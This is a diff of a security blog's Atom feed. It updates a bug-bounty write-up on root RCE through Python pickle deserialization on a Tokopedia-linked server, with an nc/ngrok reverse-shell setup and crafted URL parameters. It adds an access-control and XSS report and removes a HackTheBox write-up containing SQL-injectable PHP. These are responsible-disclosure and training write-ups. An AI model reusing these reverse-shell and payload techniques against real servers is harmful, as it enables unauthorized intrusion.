@@ -7,7 +7,7 @@
 <generator uri="https://github.com/mojombo/jekyll">Jekyll</generator>
 <link rel="self" type="application/atom+xml" href="http://localhost:4000/feed.xml" />
 <link rel="alternate" type="text/html" href="http://localhost:4000/" />
-<updated>2018-09-10T20:25:15+07:00</updated>
+<updated>2018-11-21T21:17:05+07:00</updated>
 <id>http://localhost:4000/</id>
 <author>
   <name>Abdillah Muhamad</name>
@@ -17,11 +17,11 @@
 
 
 <entry>
-  <title type="html"><![CDATA[How I Hack Tokopedia (third party server) with pickle object]]></title>
+  <title type="html"><![CDATA[How I Hack Tokopedia (3rd server) with Object de-Serialization]]></title>
   <link rel="alternate" type="text/html" href="http://localhost:4000/bugbounty/tokopedia-rce-from-pickle-unserialize"/>
   <id>http://localhost:4000/bugbounty/tokopedia-rce-from-pickle-unserialize</id>
-  <published>2018-09-10T00:00:00+07:00</published>
-  <updated>2018-09-10T00:00:00-00:00</updated>
+  <published>2018-11-21T00:00:00+07:00</published>
+  <updated>2018-11-21T00:00:00-00:00</updated>
   
   <author>
     <name>Abdillah Muhamad</name>
@@ -41,7 +41,7 @@
 
 &lt;h3 id=&quot;apa-dampaknya-&quot;&gt;Apa Dampaknya ?&lt;/h3&gt;
 &lt;hr /&gt;
-&lt;p&gt;Attacker dapat menjalankan perintah pada sistem dengan hak akses root.&lt;/p&gt;
+&lt;p&gt;Attacker dapat menjalankan perintah pada sistem dengan hak akses root dengan kemungkinan eskalasi ke sistem internal yang lain dan juga dapat memanfaatkan semua credentials yang ada pada mesin tersebut seperti &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/shadow | database | email services | API SECRET | etc &lt;/code&gt;.&lt;/p&gt;
 
 &lt;p&gt;&lt;img width=&quot;400px&quot; src=&quot;https://media.giphy.com/media/1dIo6kDOPMzsnMOJTj/giphy.gif&quot; /&gt;&lt;/p&gt;
 
@@ -56,7 +56,7 @@
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://explorer.tokopedia.com/v1/emailclick?em=1337%40gmail.com&amp;amp;user_id=S%27%5Cx8d%5Cxe9%5Cxd1Y%5Cxdb%5Cx10%5Ct%5Cx92%5Cxd2%5Cx10%5Cx80%5Cxd7%5Cx9d%5Cxa4%5Cxc7%5Cx9eM_%2A+%5Cxc6%2C%5Cxb6%5Cx91%5Cx98%5Cxe0%5Cxben%5Cxfe%5Cxda%5Cxfa%5Cxf4%27%0Ap0%0A.&amp;amp;d=S%27G%5Cxdfy%5Cxf5%5Cx00%5Cxe2G%5Cxe9F%5Cx91Gi%5Cx8d%5Crr%5Cxeb%5Cxf9%5Cxb6%5Cx87%5Cx99%60%27%0Ap0%0A.&amp;amp;ts=1536374957&amp;amp;cid=S%27%5Cxdd%5Cxe2%5Cx93%5Cx93i%5Cx0b%5Cx00%3Dd%5Cxac%24%2C%5Cxfah%5Cx91%5Cxc9Cz%5Cxc9%5Cxc65%5Cxef%5Cx81%5Cx04%5Cx84%5Cxc4-%5Cxaf%5Cxa44%5Cxe2%5Cx10ee%22%5Cxeb%5Cx0b%5Cx16N%3C%5Cxec%5Cx16%2Cs%5Cxa8%5Cxe3%5Cxaf.%5Cxe4A%5Cxc5Q%27%0Ap0%0A.&amp;amp;ut=l&amp;amp;moeclickid=5b93333e7da87848b22e8659_F_T_EM_AB_0_P_0_L_0ecli48&amp;amp;app_id=S%27%60%5Cx8ele_%5Cx8ao%5Cxb4%5Cx9dJ%5Cr%5Cx01%5Cxee%5Cx80%5Cxbc%5Cx8ck%5Cxd7%5Cx83%2FUk%60%5Cxfe%5Cx16%5Cxd7+%5Cxa5%5Cx90%5D%5Cxda%5Cx93%27%0Ap0%0A.&amp;amp;pl=A&amp;amp;c_t=ge&amp;amp;rlink=https://tokopedia.link/EBxQm0a00P?$deep_link=true%26utm_source=7teOvA%26utm_medium=email%26utm_campaign=co_OFS_BR_982018_Compilation%26utm_content=C3
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Ada beberapa parameter yang menarik karena setelah saya lakukan url-decode ternyata yang dikirim adalah dalam bentuk Pickle String Python jadi karena seperti yang kita ketahu pada dokumentasi python sendiri Pickle sudah di warning agar tidak menerima input dari user karena dapat di-abuse untuk mendapatkan akses kepada sistem&lt;/p&gt;
+&lt;p&gt;Ada beberapa parameter yang menarik karena setelah saya lakukan url-decode ternyata yang dikirim adalah dalam bentuk Pickle String Python jadi karena seperti yang kita ketahui pada dokumentasi python sendiri Pickle sudah di &lt;a href=&quot;#warning&quot;&gt;warning&lt;/a&gt; agar tidak menerima input dari user karena dapat di-abuse untuk mendapatkan akses kepada sistem&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user_id=S%27%5Cx8d%5Cxe9%5Cxd1Y%5Cxdb%5Cx10%5Ct%5Cx92%5Cxd2%5Cx10%5Cx80%5Cxd7%5Cx9d%5Cxa4%5Cxc7%5Cx9eM_%2A+%5Cxc6%2C%5Cxb6%5Cx91%5Cx98%5Cxe0%5Cxben%5Cxfe%5Cxda%5Cxfa%5Cxf4%27%0Ap0%0A.
 d=S%27G%5Cxdfy%5Cxf5%5Cx00%5Cxe2G%5Cxe9F%5Cx91Gi%5Cx8d%5Crr%5Cxeb%5Cxf9%5Cxb6%5Cx87%5Cx99%60%27%0Ap0%0A.
@@ -75,9 +75,9 @@ p0
 
 &lt;p&gt;Dari melihat struktur data tersebut sudah bisa ditebak bahwa itu pickle strings yang akan dikirimkan melalui parameter yang vulnerable tersebut, dengan melakukan modifikasi pada pickle strings yang dikirimkan saya bisa mendapatkan reverse shell untuk akses server tokopedia secara penuh.&lt;/p&gt;
 
-&lt;p&gt;untuk melakukan reverse shell kita dapat membuat listener menggunakan nc &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -lvp 8080&lt;/code&gt;, karena ip address saya tidak memiliki public ip maka saya menggunakan ngrok untuk melakukan tuneling dengan &lt;code class=&quot;highlighter-rouge&quot;&gt;./ngrok.exe tcp 8080&lt;/code&gt; kemudian kita dapat mengakses ngrok pada &lt;code class=&quot;highlighter-rouge&quot;&gt;localhost:4040&lt;/code&gt; untuk mendapatkan public address yang di assign ngrok.&lt;/p&gt;
+&lt;p&gt;untuk melakukan reverse shell kita dapat membuat listener menggunakan nc &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -lvp 8080&lt;/code&gt;, karena ip address saya tidak memiliki public ip maka saya menggunakan &lt;a href=&quot;https://ngrok.com&quot;&gt;ngrok&lt;/a&gt; untuk melakukan tuneling dengan &lt;code class=&quot;highlighter-rouge&quot;&gt;./ngrok.exe tcp 8080&lt;/code&gt; kemudian kita dapat mengakses ngrok pada &lt;code class=&quot;highlighter-rouge&quot;&gt;localhost:4040&lt;/code&gt; untuk mendapatkan public address yang di assign ngrok.&lt;/p&gt;
 
-&lt;p&gt;untuk membuat payload reverse shell dengan cPickle saya gunakan script python dibawah, kemudian output dari script ini dimasukan kedalam salah satu parameter yang vulnerable diatas yaitu &lt;code class=&quot;highlighter-rouge&quot;&gt;user_id | d | cid | app_id&lt;/code&gt; salah satu parameter saja.&lt;/p&gt;
+&lt;p&gt;untuk membuat payload reverse shell dengan cPickle saya membuat script exploit python dibawah ini, kemudian output dari script ini dimasukan kedalam salah satu parameter yang vulnerable diatas yaitu &lt;code class=&quot;highlighter-rouge&quot;&gt;user_id | d | cid | app_id&lt;/code&gt; salah satu parameter saja.&lt;/p&gt;
 
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
 
@@ -127,10 +127,30 @@ Cookie: [..REDACTED..]
 &lt;h3 id=&quot;how-to-patch-&quot;&gt;HOW TO PATCH ?&lt;/h3&gt;
 &lt;hr /&gt;
 &lt;p&gt;Jangan memasukan input user kedalam &lt;code class=&quot;highlighter-rouge&quot;&gt;cPickle.load[s]?()&lt;/code&gt; atau &lt;code class=&quot;highlighter-rouge&quot;&gt;pickle.load[s]?()&lt;/code&gt; seperti yang sudah di jelaskan pada dokumentasi python sendiri &lt;a href=&quot;https://docs.python.org/3/library/pickle.html&quot;&gt;https://docs.python.org/3/library/pickle.html&lt;/a&gt;.&lt;/p&gt;
+&lt;div id=&quot;warning&quot;&gt;
+&lt;center&gt;&lt;img src=&quot;/images/tokopedia/pythonpickle.png&quot; /&gt;&lt;/center&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/tokopedia/pythonpickle.png&quot; alt=&quot;PICKLE WARNING&quot; /&gt;&lt;/p&gt;
+&lt;h3 id=&quot;response-from-it-security-tokopedia&quot;&gt;Response From IT Security Tokopedia&lt;/h3&gt;
+&lt;hr /&gt;
+&lt;p&gt;Response dari tokopedia&lt;/p&gt;
 
-&lt;h3 id=&quot;timeline--bonus-content-dlc&quot;&gt;TIMELINE &amp;amp; BONUS CONTENT (DLC)&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;/images/tokopedia/tokopedia-response.PNG&quot; alt=&quot;Response from tokopedia&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Karena dari pihak tokopedia menyatakan kalau &lt;code class=&quot;highlighter-rouge&quot;&gt;explorer.tokopedia.com&lt;/code&gt; menggunakan service dari &lt;code class=&quot;highlighter-rouge&quot;&gt;branch.io&lt;/code&gt; maka saya mengambil inisiatif untuk bertanya langsung kepada pihak &lt;code class=&quot;highlighter-rouge&quot;&gt;branch.io&lt;/code&gt; melalui email dan dari &lt;code class=&quot;highlighter-rouge&quot;&gt;branch.io&lt;/code&gt; sendiri mengklarifikasi bahwa server &lt;code class=&quot;highlighter-rouge&quot;&gt;explorer.tokopedia.com&lt;/code&gt; tidak menggunakan service dari &lt;code class=&quot;highlighter-rouge&quot;&gt;branch.io&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;response-from-branchio&quot;&gt;Response From Branch.io&lt;/h3&gt;
+&lt;hr /&gt;
+&lt;p&gt;Response dari branch.io&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/tokopedia/branchio-response.PNG&quot; alt=&quot;Response From Branchio&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;setelah tokopedia memberitahu bahwa &lt;strong&gt;Server&lt;/strong&gt; dan &lt;strong&gt;Aplikasi&lt;/strong&gt; yang terkena serangan RCE adalah milik &lt;code class=&quot;highlighter-rouge&quot;&gt;branch.io&lt;/code&gt; kemudian saya coba laporkan celah keamanan tersebut kepada &lt;code class=&quot;highlighter-rouge&quot;&gt;branch.io&lt;/code&gt; dan diresponse kalau &lt;code class=&quot;highlighter-rouge&quot;&gt;explorer.tokopedia.com&lt;/code&gt; tidak menggunakan service dari &lt;code class=&quot;highlighter-rouge&quot;&gt;branch.io&lt;/code&gt; dan saya juga tidak bisa melakukan reproduce bug pada &lt;code class=&quot;highlighter-rouge&quot;&gt;branch.io&lt;/code&gt; ╮(╯∀╰)╭ .&lt;/p&gt;
+
+&lt;p&gt;kemudian setelah beberapa bulan saya menemukan bahwa kelemahannya ada di moengage.com namun ketika saya coba lagi ternyata bugnya telah di patch secara &lt;em&gt;misterius&lt;/em&gt; ლ(ﾟдﾟლ) ლ(ﾟдﾟლ) oleh moengage dan parameternya sudah di encrypt menggunakan enkripsi (ಥ﹏ಥ).&lt;/p&gt;
+
+&lt;h3 id=&quot;timeline--poc-video&quot;&gt;TIMELINE &amp;amp; POC Video&lt;/h3&gt;
 &lt;hr /&gt;
 
 &lt;table&gt;
@@ -154,11 +174,11 @@ Cookie: [..REDACTED..]
       &lt;td&gt;Tokopedia take down the endpoint&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
-      &lt;td&gt;10 September 2018 3:59 PM&lt;/td&gt;
-      &lt;td&gt;Rewarded&lt;/td&gt;
+      &lt;td&gt;21 November 2018 11:00 AM&lt;/td&gt;
+      &lt;td&gt;Rewarded $137&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
-      &lt;td&gt;10 September 2018 20:00 PM&lt;/td&gt;
+      &lt;td&gt;21 November 2018 21:00 PM&lt;/td&gt;
       &lt;td&gt;Public Disclose&lt;/td&gt;
     &lt;/tr&gt;
   &lt;/tbody&gt;
@@ -166,17 +186,70 @@ Cookie: [..REDACTED..]
 
 &lt;hr /&gt;
 
-&lt;ul&gt;
-  &lt;li&gt;Youtube : https://youtu.be/Fo6Emx-LMQE&lt;/li&gt;
-&lt;/ul&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;POC Video : https://youtu.be/Fo6Emx-LMQE&lt;/code&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;em&gt;That’s all folks!&lt;/em&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://media.giphy.com/media/XreQmk7ETCak0/giphy.gif&quot; width=&quot;300px&quot; /&gt;&lt;/p&gt;
 
+  
+  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/bugbounty/tokopedia-rce-from-pickle-unserialize&quot;&gt;How I Hack Tokopedia (3rd server) with Object de-Serialization&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on November 21, 2018.&lt;/p&gt;</content>
+</entry>
+
+
+
+<entry>
+  <title type="html"><![CDATA[Improper Access Control & XSS on seller.tokopedia.com]]></title>
+  <link rel="alternate" type="text/html" href="http://localhost:4000/bugbounty/improper-access-control-xss-on-seller-tokopedia-com"/>
+  <id>http://localhost:4000/bugbounty/improper-access-control-xss-on-seller-tokopedia-com</id>
+  <published>2018-11-14T08:38:00+07:00</published>
+  <updated>2018-11-14T08:38:00+07:00</updated>
+  <author>
+    <name>Abdillah Muhamad</name>
+    <uri>http://localhost:4000</uri>
+    <email>hasny1337@gmail.com</email>
+  </author>
+  
+  
+  <category scheme="http://localhost:4000/tags/#Bugbounty" term="Bugbounty" />
+  
+  
+  <content type="html">
+  
+    &lt;p&gt;&lt;strong&gt;Vulnerable Endpoint :&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;http://api-id.codemi.co.id/api/v1/post/update/&amp;lt;COMMENTID&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Kelemahan yang ditemukan adalah saya menemukan cara untuk membuat post pada seller.tokopedia.com yang seharusnya hanya bisa dilakukan oleh member yang memiliki role “administrator” atau “moderator” namun saya dengan akun role “learner” dapat membuat post layaknya admin maupun moderator dan juga dapat meracik XSS pada postingan tersebut.&lt;/p&gt;
+
+&lt;p&gt;Prosesnya untuk reproduce bug nya adalah :&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Buat komentar disalah satu post (ambil idnya)&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/uploads/gambar1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Gunakan endpoint update post &lt;code class=&quot;highlighter-rouge&quot;&gt;http://api-id.codemi.co.id/api/v1/post/update/&amp;lt;commentid&amp;gt;&lt;/code&gt; ( Seharusnya id yang dapat diterima hanya postid namun disini kita dapat mengupgrade object kita yang sebelum nya adalah komentar menjadi sebuah post dan tidak ada validasi role di endpoint tersebut )&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/uploads/gambar2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Done&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/uploads/gambar3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;/uploads/gambar4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Namun sayang nya bug tersebut out of scope karena letak kelemahan ada di applikasi pihak ketiga yaitu codemi, dan tidak berhak atas reward :( tapi reward bukan akhir dari bug bounty.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/uploads/gambar5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Akhir kata semoga diantara kita tidak takut untuk sharing karena sharing tidak akan membuat kita miskin melainkan sebaliknya akan membuat kita lebih dalam segala hal, semoga hari kita menyenangkan terutama yang membaca tulisan ini :D&lt;/p&gt;
 
   
-  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/bugbounty/tokopedia-rce-from-pickle-unserialize&quot;&gt;How I Hack Tokopedia (third party server) with pickle object&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on September 10, 2018.&lt;/p&gt;</content>
+  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/bugbounty/improper-access-control-xss-on-seller-tokopedia-com&quot;&gt;Improper Access Control & XSS on seller.tokopedia.com&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on November 14, 2018.&lt;/p&gt;</content>
 </entry>
 
 
@@ -1895,587 +1968,6 @@ just like information_schema in mysql ╰(▔∀▔)╯&lt;/p&gt;
 
   
   &lt;p&gt;&lt;a href=&quot;http://localhost:4000/websec.fr/writeup-websecfr-level01&quot;&gt;Websec.fr babysteps: Level 01 - 1pts&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on March 22, 2018.&lt;/p&gt;</content>
-</entry>
-
-
-
-<entry>
-  <title type="html"><![CDATA[Writeup Hackthebox - Enterprise]]></title>
-  <link rel="alternate" type="text/html" href="http://localhost:4000/hackthebox/writeup-hackthebox-enterprise"/>
-  <id>http://localhost:4000/hackthebox/writeup-hackthebox-enterprise</id>
-  <published>2018-03-18T00:00:00+07:00</published>
-  <updated>2018-03-18T00:00:00-00:00</updated>
-  
-  <author>
-    <name>Abdillah Muhamad</name>
-    <uri>http://localhost:4000</uri>
-    <email>hasny1337@gmail.com</email>
-  </author>
-  
-  
-  <category scheme="http://localhost:4000/tags/#hackthebox" term="hackthebox" />
-  
-  
-  <content type="html">
-  
-    &lt;h2 id=&quot;machine-detail&quot;&gt;Machine Detail&lt;/h2&gt;
-&lt;p&gt;&lt;strong&gt;Name :&lt;/strong&gt; Enterprise&lt;br /&gt;
-&lt;strong&gt;IP :&lt;/strong&gt; 10.10.10.61&lt;br /&gt;
-&lt;strong&gt;Author :&lt;/strong&gt; TheHermit&lt;br /&gt;
-&lt;strong&gt;Hostname :&lt;/strong&gt; enterprise.htb&lt;br /&gt;
-&lt;strong&gt;OS :&lt;/strong&gt; Linux&lt;br /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;discovery&quot;&gt;Discovery&lt;/h2&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Port&lt;/th&gt;
-      &lt;th&gt;Service&lt;/th&gt;
-      &lt;th&gt;Version&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;em&gt;22&lt;/em&gt;&lt;/td&gt;
-      &lt;td&gt;ssh&lt;/td&gt;
-      &lt;td&gt;(protocol 2.0)&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;em&gt;80&lt;/em&gt;&lt;/td&gt;
-      &lt;td&gt;http&lt;/td&gt;
-      &lt;td&gt;Apache httpd 2.4.10 ((Debian))&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;em&gt;443&lt;/em&gt;&lt;/td&gt;
-      &lt;td&gt;ssl/http&lt;/td&gt;
-      &lt;td&gt;Apache httpd 2.4.25 ((Ubuntu))&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;em&gt;8080&lt;/em&gt;&lt;/td&gt;
-      &lt;td&gt;http&lt;/td&gt;
-      &lt;td&gt;Apache httpd 2.4.10 ((Debian))&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;em&gt;32812&lt;/em&gt;&lt;/td&gt;
-      &lt;td&gt;unknown&lt;/td&gt;
-      &lt;td&gt;-&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
-
-&lt;p&gt;In this port 80 we can see wordpress cms is installed, 
-and i manage to run dirbuster on each http(s) service found, but 
-the result from dirbuster not found any interesting file or directory yet&lt;/p&gt;
-
-&lt;p&gt;Trying to enumerate the wordpress user manually with send get request to
-&lt;code class=&quot;highlighter-rouge&quot;&gt;http://10.10.10.61/?author=1&lt;/code&gt; we can increment the id to see if there have another user
-and just got 1 username &lt;code class=&quot;highlighter-rouge&quot;&gt;william.riker&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;next for this port SSL i try to scan using sslscan&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;•% ➜ sslscan 10.10.10.61
-Version: 1.11.11-static
-OpenSSL 1.0.2-chacha (1.0.2g-dev)
-
-Connected to 10.10.10.61
-
-Testing SSL server 10.10.10.61 on port 443 using SNI name 10.10.10.61
-
-  TLS Fallback SCSV:
-Server does not support TLS Fallback SCSV
-
-  TLS renegotiation:
-Secure session renegotiation supported
-
-  TLS Compression:
-Compression disabled
-
-... Snip ...
-
-  Supported Server Cipher(s):
-Preferred TLSv1.2  256 bits  ECDHE-RSA-AES256-GCM-SHA384   Curve P-256 DHE 256
-...snip... 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;And not seeing there is vulnerability in the ssl, and start to looking with
-dirbuster maybe can found interesting files/directory, And finally found &lt;code class=&quot;highlighter-rouge&quot;&gt;https://10.10.10.61/files/lcars.zip&lt;/code&gt; this zip files
-contains wordpress plugin sourcecode named &lt;code class=&quot;highlighter-rouge&quot;&gt;lcars&lt;/code&gt;, I got 3 files inside the zip file
-the file is &lt;code class=&quot;highlighter-rouge&quot;&gt;lcars.php, lcars_db.php, lcars_dbppost.php&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// this is lcars.php
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-&lt;span class=&quot;cm&quot;&gt;/*
-*     Plugin Name: lcars
-*     Plugin URI: enterprise.htb
-*     Description: Library Computer Access And Retrieval System
-*     Author: Geordi La Forge
-*     Version: 0.2
-*     Author URI: enterprise.htb
-*                             */&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;// Need to create the user interface. &lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;// need to finsih the db interface&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;// need to make it secure&lt;/span&gt;
-
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// This is lcars_db.php
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/var/www/html/wp-config.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mysqli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DB_HOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DB_USER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DB_PASSWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DB_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;// Test the connection:&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mysqli_connect_errno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()){&lt;/span&gt;
-    &lt;span class=&quot;c1&quot;&gt;// Connection Error&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Couldn't connect to the database: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mysqli_connect_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-
-&lt;span class=&quot;c1&quot;&gt;// test to retireve an ID&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'query'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'query'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SELECT ID FROM wp_posts WHERE post_name = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Failed to read query&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;in this file we could see our input is directly used to construct the SQL Query,
-so this is straight forward SQL Injection, but the problem is the code is correct
-because &lt;code class=&quot;highlighter-rouge&quot;&gt;$result&lt;/code&gt; is returning an array and php can’t echo-ing an array so we can’t get
-the output easily.&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// This is lcars_dbpost.php
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
